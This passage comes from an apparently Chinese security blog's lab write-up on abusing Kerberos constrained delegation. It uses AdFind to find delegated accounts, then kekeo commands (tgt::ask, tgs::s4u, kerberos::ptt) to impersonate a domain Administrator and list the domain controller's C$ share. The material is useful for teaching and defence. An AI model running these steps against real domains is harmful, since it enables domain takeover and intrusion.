+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316503-bQHB9YknitVRJ5giJcbnJh-0-5cf257ec0764d93d51096c1b6659b4f6&image_process=resize,w_617.5" alt="img" style="zoom:80%;">
+
+<p>
+
+<img src="/2022/05/15/22-0515-01/image-165331714971847.png" alt="img" style="zoom:80%;">
+
+</p><p>配置服务账号websec到域控AD1的约束性委派，即允许服务服务账号websec访问到AD1</p>
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316503-8fTdFykzLX51KaBBtX5uEn-0-48df30d3a3ef51df834442f926b610a4&image_process=resize,w_681-165331716381850.25" alt="img" style="zoom:80%;">
+
+<p>更准确是允许服务账号访问AD1的cifs服务</p>
+<img src="/2022/05/15/22-0515-01/image-165331718097952.png" alt="img" style="zoom:80%;">
+
+<p>
+
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316504-j9jyP3tAGo3wig5wbJofwo-0-510df19ec24535767d3f0d3a4c768374&image_process=resize,w_601.25" alt="img" style="zoom:80%;"></p></li>
+</ol>
+<h2 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h2><p>这里复现用12server2来做测试（用12server1也行没啥区别）</p>
+<ol>
+<li><p>在12server2上用域用户hack登陆，然后查询配置约束委派的服务账户有哪些</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 查询域中配置约束委派的机器账户</span><br><span class="line">AdFind.exe -h 10.10.10.142 -u hack -up pass@123 -b &quot;DC=redteam,DC=club&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br><span class="line"># 查询域中配置约束委派的服务账户</span><br><span class="line">AdFind.exe -h 10.10.10.142 -u hack -up pass@123 -b &quot;DC=redteam,DC=club&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br><span class="line"></span><br><span class="line">或者用下面的命令（但是测试的时候用下面命令查不出来。。很奇怪。。。玄学问题）</span><br><span class="line"></span><br><span class="line"># 查询域中配置约束委派的机器账户</span><br><span class="line">AdFind.exe -b &quot;DC=redteam,DC=club&quot; -f &quot;(&amp;(samAccountType=805306369)(msds- allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br><span class="line"># 查询域中配置约束委派的服务账户</span><br><span class="line">AdFind.exe -b &quot;DC=redteam,DC=club&quot; -f &quot;(&amp;(samAccountType=805306368)(msds- allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316504-9MQhyo7C6eMRWr3BQzQkiB-0-1bb207bc065146209b5891e7e5b26f20&image_process=resize,w_913.75" alt="img" style="zoom:80%;">
+</li>
+<li><p>通过kekeo请求服务用户websec的TGT</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:websec /domain:redteam.club /password:pass@123 /ticket:test.kirbi</span><br><span class="line">/user: 服务用户的用户名</span><br><span class="line">/password: 服务用户的明文密码</span><br><span class="line">/domain: 所在域名</span><br><span class="line">/ticket: 指定票据名称，不过这个参数没有生效，可以忽略</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316504-gZmbaaCGSqCKpdCN8E4mUu-0-2015386a5558cfe7ee459300903f28fa&image_process=resize,w_827.5" alt="img" style="zoom:80%;">
+
+<p>
+
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316504-9zhzdozvTg1Yz2onwSPmPb-0-5aeb9ed5a2ee87ee2b195e68051e87b1&image_process=resize,w_116.25" alt="img" style="zoom:80%;">
+</p></li>
+<li><p>利用这个 TGT 通过伪造 s4u 请求以域管理员用户身份请求访问 域控ad1上 CIFS，注意：这里实际是先请求了ST1票据，然后又用ST1请求了ST2票据，也就是把上面测试环境图中的③和⑤两个过程合并了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_websec@REDTEAM.CLUB_krbtgt~redteam.club@REDTEAM.CLUB.kirbi /user:Administrator@redteam.club /service:cifs/ad1.redteam.club</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316504-b7Uk98updL1t4ZFz1wihPu-0-4d1994ffd93c3f11af24514330552a2e&image_process=resize,w_838.75" alt="img" style="zoom:80%;">
+
+<p>ST1票据如下：</p>
+<img src="/2022/05/15/22-0515-01/image-165331742593263.png" alt="img" style="zoom:80%;">
+
+<p>ST2票据如下：</p>
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316504-fZFw5BUdpnzD7JukncnVxy-0-75c45592256f8ce092c6e1a915f9ff46&image_process=resize,w_96.25" alt="img" style="zoom:80%;">
+
+<p>注意：我们最后实际需要用的是ST2票据</p>
+</li>
+<li><p>使用kekeo导入ST2票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@redteam.club@REDTEAM.CLUB_cifs~ad1.redteam.club@REDTEAM.CLUB.kirbi</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316504-p1P9TXmUiHi6ZpuP6ALXd2-0-95f20cd78ab3609a0aeeebd9ef536c69&image_process=resize,w_818.75" alt="img" style="zoom:80%;">
+</li>
+<li><p>访问域控的CIFS服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\ad1.redteam.club\c$</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316504-b1jEHgk4dUCWawHVxDypqQ-0-43094d1531c6721c0cb4afcb4c970570&image_process=resize,w_551.25" alt="img" style="zoom:80%;"></li>
+</ol>
+<h1 id="资源委派"><a href="#资源委派" class="headerlink" title="资源委派"></a>资源委派</h1>
+        </div>		
+		
+        <section class="post-tags">
+            <div>
+                <span>标签:</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="/">
+                    <i class="iconfont icon-home"></i>
+                    主页
+                </a>
+                <span>· </span>
+                <a href="javascript:window.history.back();">
+                    <i class="iconfont icon-back"></i>
+                    返回
+                </a>
+                
+                
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/05/16/22-0516-01/">vulnhub靶机—OS-Hax</a>
+            
+            
+            <a class="next" rel="next" href="/2022/05/15/22-0514-02/">vulnhub靶机—trollcave</a>
+            
+        </section>
+        <br>
+        
+            <section id="comments" class="comments">
+              <style>
+                  .comments{ margin-top: 30px;}
+                  .v .vlist .vcard .vcontent {padding-top: 0;}
+                  .vcontent p { color:grey; margin-bottom: 10px;}
+                  .v * {line-height: normal;}
+                  .v .vwrap  {border-radius: 0px; padding: 10px;}
+                  .v .vbtn {border-radius: 0px;}
+                  .v code, .v pre {border-radius: 0px;}
+                  .v .vlist .vcard .vhead .vsys {border-radius: 1px; padding: 2px;}
+                  .v .vlist .vcard .vhead .vnick {color: #2d96bd;}
+                  .v .vlist .vcard .vh .vmeta .vat{color: #c7254e;}
+                  .v .vlist .vcard {padding-top: 0;}
+                  .v .vlist .vcard .vimg { width: 2.5em; height: 2.5em; }
+                  .v .vlist .vcard .vquote .vimg { width: 2.5em; height: 2.5em; }
+              </style>
+              <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    new Valine({
+        app_id: 'baahrwTTyOayDYUv5AtkdGJj-gzGzoHsz',
+        app_key: 'iTfzn8X60g9v0zTtnvToc09l',
+        placeholder: '想对作者说点什么...',
+        notify: 'false',
+        verify: 'false',
+        avatar: 'retro',
+        visitor: 'true'
+    });
+</script>
+            </section>
+        
+    </article>
+</div>
+
+
+
+<style>
+
+.post-wrap { table-layout:fixed; word-break:break-all; overflow:hidden; }
+
+</style>
+        </div>
+        <footer id="footer" class="footer">
+
+ <div class="copyright">
+
+ <span>© 𝐴_𝑌𝑢
+
+ <!-- 访客数量 -->
+
+ 
+
+ <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    | 总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    | 总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></i>
+</span>
+
+
+ 
+
+ </span>
+
+ </div>
+
+</footer>
+    </div>
+</body>
+</html>
+
+
+	
+
+
+
+<script type="text/javascript" src="\js\jquery.js"></script>
+<script type="text/javascript" src="\js\jquery.min.js"></script>
+
+<script  type="text/javascript" src="\js\snow.js"></script>
+
